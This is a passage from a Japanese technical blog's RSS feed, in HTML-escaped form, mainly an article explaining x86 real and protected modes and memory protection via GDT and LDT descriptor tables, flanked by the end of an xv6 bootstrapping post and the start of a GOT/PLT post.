punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;結構時間がかかりましたがxv6 UNIXのブートストラップについて深掘りしつつ読み込みました。&lt;/p&gt;
&lt;p&gt;次回からようやく本題(カーネルのソースコードを読む)に入れそうです。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[x86CPUのメモリ保護機構に関するメモ書き(GDTとLDT)]]></title><description><![CDATA[UNIXのソースコードを読む中で、起動時のプロテクトモードへの移行プロセスが気になったので調べたことをまとめました。]]></description><link>https://kashiwaba-yuki.com/linux-memory-protect-gdt-ldt</link><guid isPermaLink="false">https://kashiwaba-yuki.com/linux-memory-protect-gdt-ldt</guid><pubDate>Sun, 09 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;UNIXのソースコードを読む中で、起動時のプロテクトモードへの移行プロセスが気になったので調べたことをまとめました。&lt;/p&gt;
&lt;p&gt;技術的に誤りが無いように努めていますが、もし万が一誤りがあればご指摘いただけると助かります。&lt;/p&gt;
&lt;p&gt;今回は、Intelのx86CPUをターゲットとしています。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A8%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89&quot;&gt;リアルモードとプロテクトモード&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89&quot;&gt;リアルモード&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89&quot;&gt;プロテクトモード&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E3%83%A1%E3%83%A2%E3%83%AA%E4%BF%9D%E8%AD%B7&quot;&gt;プロテクトモードにおけるメモリ保護&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%82%BF%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;ディスクリプタテーブルについて&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#gdt%E3%82%B0%E3%83%AD%E3%83%BC%E3%83%90%E3%83%AB%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%82%BF%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB&quot;&gt;GDT(グローバルディスクリプタテーブル)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ldt%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%82%BF%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB&quot;&gt;LDT(ローカルディスクリプタテーブル)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;リアルモードとプロテクトモード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A8%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89&quot; aria-label=&quot;リアルモードとプロテクトモード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;リアルモードとプロテクトモード&lt;/h2&gt;
&lt;h3 id=&quot;リアルモード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89&quot; aria-label=&quot;リアルモード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;リアルモード&lt;/h3&gt;
&lt;p&gt;x86CPUにおけるリアルモードとは、&lt;code class=&quot;language-text&quot;&gt;Intel 8086&lt;/code&gt;CPU互換のための動作モードです。&lt;/p&gt;
&lt;p&gt;x86の場合は起動時の動作モードとなり、BIOSもリアルモードで動作します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Intel 8086&lt;/code&gt;CPU互換のため、リアルモードはすべてのレジスタのアドレス長が16bitに制限されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikipedia.org/wiki/%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;リアルモード - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;メモリアドレスを参照する場合はセグメントレジスタの値を使用して、20bitのアドレス空間にアクセスすることができます。&lt;/p&gt;
&lt;p&gt;また、A20 Lineを有効化することで21bitのアドレス空間を使用することができるようになります。&lt;/p&gt;
&lt;p&gt;リアルモードでは、後述するプロテクトモードに存在する、ハードウェアベースのメモリ保護や仮想メモリは存在しません。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/Real_Mode&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Real Mode - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;プロテクトモード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89&quot; aria-label=&quot;プロテクトモード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロテクトモード&lt;/h3&gt;
&lt;p&gt;プロテクトモードは、x86CPUにおいてメモリ空間が32bitに拡張され、メモリやI/Oの保護が可能となる動作モードです。&lt;/p&gt;
&lt;p&gt;階層的な特権管理(リングプロテクション)とタスク間のメモリ保護が可能です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikipedia.org/wiki/%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;プロテクトモード - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/Protected_Mode&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Protected Mode - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前述した通り、x86CPUにおいてBIOSはリアルモードで動作しているため、プロテクトモード移行後はBIOS割込みを使用できなくなります。&lt;/p&gt;
&lt;p&gt;プロテクトモードにおけるメモリ保護の仕組みについては後述します。&lt;/p&gt;
&lt;h2 id=&quot;プロテクトモードにおけるメモリ保護&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E3%83%A1%E3%83%A2%E3%83%AA%E4%BF%9D%E8%AD%B7&quot; aria-label=&quot;プロテクトモードにおけるメモリ保護 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロテクトモードにおけるメモリ保護&lt;/h2&gt;
&lt;p&gt;プロテクトモードでは、プログラムに対して参照可能なメモリ領域を定義する必要があります。これはカーネルプログラムにおいても同様です。&lt;/p&gt;
&lt;p&gt;まず、x86CPUはプログラムやデータをセグメントというメモリ内の連続した領域の単位で扱います。&lt;/p&gt;
&lt;p&gt;セグメントの単位は64KBか4GBの2種類があります。&lt;/p&gt;
&lt;p&gt;プロテクトモードにおけるメモリ保護では、メモリ領域の開始点とサイズ、そのメモリ領域の読み/書き/実行権限などをセグメントディスクリプタとよび、ディスクリプタテーブルによって管理します。&lt;/p&gt;
&lt;p&gt;プロテクトモードでプログラムがメモリを参照する場合、DSレジスタは直接メモリアドレスの値を指しません。&lt;/p&gt;
&lt;p&gt;その代わり、DSレジスタはディスクリプタテーブルを参照し、セグメントの情報を取得します。&lt;/p&gt;
&lt;p&gt;この仕組みによって、プログラムが自由なメモリ領域を参照するためにはディスクリプタテーブルの書き換えが必須となります。&lt;/p&gt;
&lt;p&gt;しかし、ディスクリプタテーブルはプログラムから書き換えられないようになっているため、結果としてプログラムはあらかじめ決められたメモリ領域以外を参照できず、メモリの保護が実現されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://amzn.to/3JVSphh&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsはなぜ動くのか&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ascii.jp/elem/000/000/649/649680/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ASCII.jp：Windowsのメモリー管理をx86の仕組みから読み解く (1/4)&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ディスクリプタテーブルについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%82%BF%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;ディスクリプタテーブルについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ディスクリプタテーブルについて&lt;/h2&gt;
&lt;p&gt;ディスクリプタテーブルには、GDT(グローバルディスクリプタテーブル)とLDT(ローカルディスクリプタテーブル)の2種類が存在します。&lt;/p&gt;
&lt;h3 id=&quot;gdtグローバルディスクリプタテーブル&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gdt%E3%82%B0%E3%83%AD%E3%83%BC%E3%83%90%E3%83%AB%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%82%BF%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB&quot; aria-label=&quot;gdtグローバルディスクリプタテーブル permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;GDT(グローバルディスクリプタテーブル)&lt;/h3&gt;
&lt;p&gt;GDTは、通常システムに1つだけ定義されるディスクリプタテーブルです。&lt;/p&gt;
&lt;p&gt;GDTでは複数のLDTが管理されます。&lt;/p&gt;
&lt;p&gt;x86CPUには、GDTの先頭アドレスを指すためのGDTRと呼ばれるレジスタが存在します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Global_Descriptor_Table&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Global Descriptor Table - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/Global_Descriptor_Table&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Global Descriptor Table - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ldtローカルディスクリプタテーブル&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ldt%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%82%BF%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB&quot; aria-label=&quot;ldtローカルディスクリプタテーブル permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;LDT(ローカルディスクリプタテーブル)&lt;/h3&gt;
&lt;p&gt;LDTはプログラムごとに作成されるディスクリプタテーブルです。&lt;/p&gt;
&lt;p&gt;x86CPUでは、プログラムはディスクリプタテーブルで定義されたアドレス以外の領域にはアクセスできません。&lt;/p&gt;
&lt;p&gt;そのため、プログラムごとに競合しないディスクリプタテーブルをOSが管理することによって、各プログラムが互いのメモリ領域を参照することを防ぎ、メモリ保護を実現することができます。&lt;/p&gt;
&lt;p&gt;x86CPUには、GDTRと同様に、現在使用しているLDTの先頭アドレスを指定するためのレジスタとしてLDTRが用意されています。&lt;/p&gt;
&lt;p&gt;プログラムがセグメントレジスタに値をセットしようとしたとき、CPUはLDTRを参照し、プログラムがアクセスしようとしているアドレスの参照と、アクセス可否の検証を行います。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;x86CPUにおけるプログラム実行時の流れを整理すると、まずプログラムが実行状態に切り替わるとき、CPUはGDTRから参照したGDTより、実行対象のLDTのインデックスを特定して、LDTRに格納しておきます。&lt;/p&gt;
&lt;p&gt;プログラムが特定のセグメントに対して参照を要求した場合、CPUはLDTRからLDTを参照して、参照先のアドレスの取得と参照可否の検証を行います。&lt;/p&gt;
&lt;p&gt;この一連の処理によって、プログラムはあらかじめ定義されたメモリ領域以外を参照することができず、メモリ保護が実現されます。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JVSphh&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsはなぜ動くのか&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[GOT/PLTを経由したライブラリ関数呼び出しの流れを追う]]></title><description><![CDATA[GOTとPLTの概要についてまとめるとともに実際に検証してみた内容をまとめています。]]></description><link>https://kashiwaba-yuki.com/linux-got-plt</link><guid isPermaLink="false">https://kashiwaba-yuki.com/linux-got-plt</guid><pubDate>Thu, 06 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;今回は、GOTとPLTの概要についてまとめるとともに実際に検証を行っていきます。&lt;/p&gt;
&lt;p&gt;この記事を書き始めたきっかけとしては、位置独立コード(PIC)について調べていく中でGOTがよくわからなくなってしまったことです。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
